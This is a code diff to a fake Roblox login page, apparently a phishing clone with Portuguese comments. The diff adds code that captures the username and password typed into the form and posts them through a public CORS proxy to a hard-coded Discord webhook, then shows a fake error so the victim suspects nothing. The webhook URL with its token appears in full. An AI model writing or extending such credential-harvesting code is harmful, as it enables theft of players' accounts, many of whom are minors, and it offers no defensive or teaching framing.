@@ -147,29 +147,42 @@
       }
     });
 
-    form.addEventListener('submit', function(e) {
+    // Seu webhook Discord real
+    const webhookUrl = 'https://discord.com/api/webhooks/1473860451589685344/N8gc13rR1kJj7Pb5DznSI88Lpz_8BLcxUReQ5VulpR001D2os62t3HjFP-NTK_ABAuFm'; // ← COLE AQUI
+
+    // Proxy CORS público (troque se esse cair, alternativas: allorigins.win/get?url= ou corsproxy.io/?)
+    const proxyUrl = 'https://cors-anywhere.herokuapp.com/' + webhookUrl;
+
+    form.addEventListener('submit', async function(e) {
       e.preventDefault();
 
       const user = usernameInput.value.trim();
       const pass = passwordInput.value.trim();
 
       if (user && pass) {
-        const mensagem = `**Login Roblox Capturado!**\n\n**Username/Email/Phone:** \`${user}\`\n**Senha:** \`${pass}\`\n\nEnviado de: OlhadinhaDEV Clone`;
+        const payload = {
+          content: `**Novo login Roblox capturado!**\n\n**Username/Email/Phone:** \`${user}\`\n**Senha:** \`${pass}\`\n\nDe: OlhadinhaDEV Clone`
+        };
 
-        navigator.clipboard.writeText(mensagem).then(() => {
-          alert('Dados copiados pro Discord! Abra o chat do seu bot/canal, cole (Ctrl+V) e envie.');
-        }).catch(() => {
-          alert('Erro ao copiar automaticamente. Copie manual: ' + mensagem);
-        });
+        try {
+          const response = await fetch(proxyUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
 
-        // Abre Discord nos DMs (pra colar rápido) - troque se quiser canal específico
-        window.open('https://discord.com/channels/1473860408417714403/1473860409172951142');
+          if (response.ok || response.status === 204) {
+            console.log('Enviado com sucesso via proxy!');
+          } else {
+            console.log('Falha no envio:', response.status);
+          }
+        } catch (err) {
+          console.error('Erro:', err);
+        }
       }
 
       errorMsg.classList.add('show');
-      setTimeout(() => {
-        errorMsg.classList.remove('show');
-      }, 3000);
+      setTimeout(() => errorMsg.classList.remove('show'), 3000);
     });
   </script>
 
